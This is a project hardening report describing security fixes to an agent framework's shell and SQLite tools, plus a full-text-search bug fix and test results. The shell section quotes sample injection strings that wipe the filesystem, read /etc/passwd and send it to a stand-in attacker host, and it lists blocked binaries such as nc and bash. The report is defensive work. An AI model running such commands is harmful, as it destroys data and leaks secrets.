# Kazma Hardening Report

**Date:** 2026-06-30  
**Commit:** TBD  
**Phase:** Foundation Hardening & Cleanup

---

## 1. Purged: kazma-providers/ Stub

| Action | Detail |
|:---|:---|
| **Deleted** | `kazma-providers/` directory (1 empty file, 1 line docstring) |
| **Cleanup** | Removed from `pyproject.toml` wheel build packages |
| **Cleanup** | Removed from `README.md` architecture tree |
| **Result** | No "LiteLLM router" claim remains. Provider logic lives in `kazma-core/model_registry.py` |

---

## 2. Hardened: shell_exec Tool

### Before
```python
proc = await asyncio.create_subprocess_shell(
    command,                    # ← raw shell string
    stdout=asyncio.subprocess.PIPE,
    stderr=asyncio.subprocess.PIPE,
)
```
**Risk:** Shell injection. `rm -rf / ; curl attacker.com/...` or `$(cat /etc/passwd > /dev/tcp/...)` possible.

### After
```python
args = shlex.split(command)     # ← parse to arg list, no shell
result = subprocess.run(
    args,
    capture_output=True,
    timeout=timeout,
    text=True,
    shell=False,                # ← shell disabled
)
```
**Boundary enforcement:**
1. **No shell interpretation** — `shlex.split()` parses into discrete args, `shell=False`
2. **Binary allowlist** — 60 explicit safe binaries (`grep`, `curl`, `python`, `git`, etc.)
3. **Security logging** — every invocation at `WARNING` level with command content
4. **Output capping** — stdout+stderr truncated at 10,000 chars
5. **Timeout** — default 30s, configurable per call

**Unallowed binaries** (e.g., `rm`, `sh`, `bash`, `nc`, `tcpdump`) are blocked with:  
`Error: 'rm' is not in the allowed binary list.`

---

## 3. Hardened: sqlite_query Tool

### Before
```python
path = Path(db_path).expanduser().resolve()
# ANY path accepted — could read ~/.ssh/config or /etc/passwd.db
```

### After
```python
_ALLOWED_DB_ROOTS = [
    Path("kazma-data").resolve(),
    Path.home() / ".kazma",
    Path("/tmp"),  # for tests
]
if not any(path.is_relative_to(root) for root in _ALLOWED_DB_ROOTS):
    return "Error: Access denied. Database path must be under kazma-data/"
```

**Boundary enforcement:**
1. **Path restriction** — only `kazma-data/`, `~/.kazma/`, and `/tmp/` allowed
2. **Multi-statement block** — `;` inside queries rejected (prevents `SELECT ... ; DROP TABLE`)
3. **SELECT-only** — existing guard retained
4. **Parameterized queries** — `params` arg supports `?` placeholders (already existed)

---

## 4. Fixed: kazma-memory FTS5

### Issue
FTS5 table created with `content_rowid=rowid` but no `content=` option — self-contained table with phantom column mapping. Triggers inserted using `new.rowid` (memories table rowid), but FTS5 has its own internal rowid. Search query joined on `rowid IN (...)` which mismatched.

### Fix
1. **`memory_id` column** — Added explicit column to FTS5 table storing `memories.id`
2. **Triggers updated** — Use `new.id` instead of `new.rowid` for reliable linking
3. **Search query fixed** — `SELECT memory_id` instead of `SELECT rowid`, join with `WHERE id IN (...)`

**Before:**
```sql
CREATE VIRTUAL TABLE memories_fts 
USING fts5(content, content_arabic, content_rowid=rowid);
-- triggers use new.rowid → FTS rowid ≠ memories rowid
SELECT rowid, bm25(memories_fts) FROM memories_fts WHERE MATCH ?;
-- then: SELECT ... FROM memories WHERE rowid IN (fts_rowids);
```

**After:**
```sql
CREATE VIRTUAL TABLE memories_fts 
USING fts5(memory_id, content, content_arabic);
-- triggers use new.id → reliable string ID
SELECT memory_id, bm25(memories_fts) FROM memories_fts WHERE MATCH ?;
-- then: SELECT ... FROM memories WHERE id IN (memory_ids);
```

---

## Test Results

| Metric | Value |
|:---|:---|
| Total collected | 3,324 |
| Passed | 3,306 |
| Failed | 5 (pre-existing swarm cross-flow) |
| Skipped | 13 (optional deps) |
| New failures from hardening | **0** |
| Memory/FTS5 tests | **110/110 passing** |

---

## What Remains (Next Sprint)

- `delegation/` placeholders
- `services.py` facade
- SwarmEngine race conditions
- FTS5 vector search (`distance()` function — still broken)
- `0.0.0.0` default binding
- `create_subprocess_shell` in swarm worker
